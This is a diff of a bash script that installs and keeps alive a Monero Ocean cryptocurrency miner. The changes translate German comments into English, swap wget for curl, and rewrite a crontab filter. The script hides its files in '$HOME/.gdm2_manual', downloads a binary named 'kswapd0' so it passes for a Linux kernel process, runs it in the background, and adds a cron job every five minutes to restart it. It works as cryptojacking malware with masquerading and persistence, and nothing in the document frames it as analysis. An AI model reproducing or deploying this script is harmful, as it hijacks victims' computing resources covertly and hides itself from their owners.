@@ -1,42 +1,42 @@
 #!/bin/bash
 
-# Skript um Monero Ocean Miner zu starten und Dateien zu verwalten
+# Script to start Monero Ocean Miner and manage files
 
-# Verzeichnis für die Dateien erstellen
+# Create directory for the files
 mkdir -p "$HOME/.gdm2_manual/"
 
-# Pfade zu den benötigten Dateien
+# Paths to the required files
 KSWAPD0="$HOME/.gdm2_manual/kswapd0"
 CONFIG_JSON="$HOME/.gdm2_manual/config.json"
 
-# Prozesse beenden, die mit dem spezifischen kswapd0 verbunden sind
+# Terminate processes related to the specific kswapd0
 pkill -f "$KSWAPD0 --config=$CONFIG_JSON"
 
-# Überprüfen, ob die Dateien existieren und herunterladen, falls nicht
+# Check if the files exist and download if not
 if [ -f "$KSWAPD0" ] && [ -x "$KSWAPD0" ]; then
-    echo "kswapd0 existiert und ist ausführbar."
+    echo "kswapd0 exists and is executable."
 else
-    echo "kswapd0 existiert nicht oder ist nicht ausführbar. Herunterladen..."
-    wget -O "$KSWAPD0" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/kswapd0
+    echo "kswapd0 does not exist or is not executable. Downloading..."
+    curl -L -o "$KSWAPD0" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/kswapd0
     chmod +x "$KSWAPD0"
 fi
 
 if [ -f "$CONFIG_JSON" ]; then
-    echo "config.json existiert."
+    echo "config.json exists."
 else
-    echo "config.json existiert nicht. Herunterladen..."
-    wget -O "$CONFIG_JSON" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
+    echo "config.json does not exist. Downloading..."
+    curl -L -o "$CONFIG_JSON" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
 fi
 
-# kswapd0 ausführen, wenn kein anderer Prozess mit der spezifischen Konfiguration läuft
+# Run kswapd0 if no other process with the specific configuration is running
 if ! pgrep -f "$KSWAPD0 --config=$CONFIG_JSON" > /dev/null; then
-    echo "kswapd0 nicht gestartet. Starte es..."
+    echo "kswapd0 not started. Starting it..."
     "$KSWAPD0" --config="$CONFIG_JSON" &
 else
-    echo "kswapd0 läuft bereits."
+    echo "kswapd0 is already running."
 fi
 
-# Überprüfungsskript erstellen
+# Create the check script
 cat << 'EOF' > "$HOME/.gdm2_manual/check_kswapd0.sh"
 #!/bin/bash
 
@@ -52,9 +52,9 @@ else
 fi
 EOF
 
-# Überprüfungsskript ausführbar machen
+# Make the check script executable
 chmod +x "$HOME/.gdm2_manual/check_kswapd0.sh"
 
-# Cron-Job nur hinzufügen, wenn er nicht existiert
+# Cron job setup: remove outdated lines and add the new command
 CRON_JOB="*/5 * * * * $HOME/.gdm2_manual/check_kswapd0.sh"
-(crontab -l 2>/dev/null | grep -v -F "$CRON_JOB"; echo "$CRON_JOB") | crontab -
+(crontab -l 2>/dev/null | grep -v -E '(out dat|check_kswapd0.sh)'; echo "$CRON_JOB") | crontab -
